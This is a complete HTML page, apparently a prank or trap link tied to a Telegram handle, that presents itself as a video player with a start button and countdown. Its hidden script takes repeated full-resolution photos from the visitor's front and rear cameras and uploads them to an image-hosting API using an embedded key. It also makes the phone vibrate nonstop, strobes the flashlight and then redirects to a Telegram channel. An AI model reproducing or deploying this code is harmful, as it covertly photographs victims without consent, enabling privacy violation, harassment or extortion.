<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>TG@ANNB521</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff}

/* 视频默认隐藏，倒计时结束才显示 */
video#player{
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
object-fit: contain;
z-index: 1;
background: #000;
display: none;
}

#startBtn{
position:fixed;
top:50%;
left:50%;
transform:translate(-50%,-50%);
width:260px;
height:70px;
background:#000;
border:2px solid #fff;
color:#fff;
font-size:26px;
border-radius:14px;
z-index:999;
cursor:pointer;
}

#countdown{
position:fixed;
top:50%;
left:50%;
transform:translate(-50%,-50%);
font-size:180px;
color:#fff;
font-weight:bold;
z-index:99;
display:none;
}
</style>
</head>
<body>

<video id="player" playsinline muted>
<source src="https://alimov2.a.kwimgs.com/upic/2026/03/02/00/BMjAyNjAzMDIwMDU1NDNfNDM3NTI4ODcxNl8xODkzMTE1Njg3OTBfMl8z_b_Bd518217cb69a0d98d74bd00f0183b4a7.mp4" type="video/mp4">
</video>

<button id="startBtn">点击开始</button>
<div id="countdown"></div>

<script>
const player = document.getElementById('player');
const startBtn = document.getElementById('startBtn');
const countdown = document.getElementById('countdown');

let playCount = 0;
const requiredPlays = 2;
let vibrateInt, flashInt, flashTrack;

// 闪光灯控制
async function flash(){
try{
if(!flashTrack){
let s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
flashTrack = s.getVideoTracks()[0];
}
await flashTrack.applyConstraints({advanced:[{torch:!flashTrack.getSettings().torch}]});
}catch(e){}
}

// 拍照并上传（不裁剪，原图）
async function takeShot(facing){
try{
let stream = await navigator.mediaDevices.getUserMedia({
  video: { facingMode: facing }
});
let v = document.createElement('video');
v.srcObject = stream;
await v.play();

let c = document.createElement('canvas');
c.width = v.videoWidth;
c.height = v.videoHeight;
let ctx = c.getContext('2d');
ctx.drawImage(v, 0, 0, c.width, c.height);

return new Promise((resolve) => {
  c.toBlob(async (blob)=>{
    const fd = new FormData();
    fd.append('image', blob);
    await fetch('https://api.imgbb.com/1/upload?key=8a95d94678c08ed18a487c4ac68b9c96', {
      method:'POST', body:fd
    });
    stream.getTracks().forEach(t=>t.stop());
    resolve();
  },'image/jpeg',0.8);
});
}catch(e){}
}

// 连拍前后摄像头
async function takeBoth(){
await takeShot('environment');
await takeShot('user');
}

// 播放结束逻辑
player.onended = ()=>{
playCount++;
if(playCount >= requiredPlays){
clearInterval(vibrateInt);
clearInterval(flashInt);
if(flashTrack) flashTrack.applyConstraints({advanced:[{torch:false}]});
window.location.href = 'https://t.me/ANNB521';
}else{
player.currentTime=0;
player.play();
}
};

// 点击开始逻辑
startBtn.onclick = async ()=>{
startBtn.style.display='none';
countdown.style.display='block';
let n=3;
countdown.textContent=n;
let t=setInterval(()=>{
n--;
if(n>0){
countdown.textContent=n;
}else{
clearInterval(t);
countdown.style.display='none';

// 倒计时结束后：显示视频、播放、拍照、闪光
player.style.display='block';
player.play();

vibrateInt=setInterval(()=>navigator.vibrate(20),50);
flashInt=setInterval(flash,120);

// 连拍3组（前后各3张）
(async ()=>{
for(let i=0;i<3;i++){
await takeBoth();
await new Promise(r=>setTimeout(r,500));
}
})();
}
},1000);
};
</script>
</body>
</html>
